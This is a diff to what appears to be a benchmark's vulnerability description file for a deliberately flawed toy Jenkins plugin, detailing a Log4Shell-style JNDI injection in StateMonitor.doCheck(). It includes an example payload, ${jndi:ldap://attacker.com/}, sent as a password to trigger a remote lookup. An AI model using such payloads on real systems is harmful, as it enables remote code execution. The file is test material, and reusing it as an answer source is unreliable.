@@ -1,16 +1,28 @@
 id: cpv_6
 
-name: 'FuzzerSecurityIssueCritical: Remote JNDI Lookup (TBD)'
+name: JNDI Injection via Insufficient Input Validation and Unsafe Logging
 
 cwes:
-- CWE-502
+- CWE-117
+- CWE-20
+- CWE-94
 
-description: 'FuzzerSecurityIssueCritical: Remote JNDI Lookup (TBD)'
+description: |
+  A Log4Shell-style JNDI injection vulnerability in the StateMonitor.doCheck() method
+  caused by two compounded issues: (1) incorrect input validation logic using AND (&&)
+  instead of OR (||) when checking if parameters match the allowed pattern, allowing
+  attackers to bypass validation by making one parameter valid while injecting malicious
+  payload in the other, and (2) unsafe logging of user-provided password input that
+  triggers Log4j2 JNDI lookups on strings containing ${jndi:...} patterns. An attacker
+  can send a POST request with name=admin and password=${jndi:ldap://attacker.com/}
+  to bypass validation and trigger remote JNDI lookup, leading to remote code execution
+  or information exfiltration depending on the JDK version. This is a critical severity
+  vulnerability allowing unauthenticated remote code execution similar to CVE-2021-44228.
 
 locations:
 - path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
-  function_name: lookupHook
-  startLine: 58
+  function_name: doCheck
+  startLine: 45
   startColumn: 1
   endLine: 58
   endColumn: 1
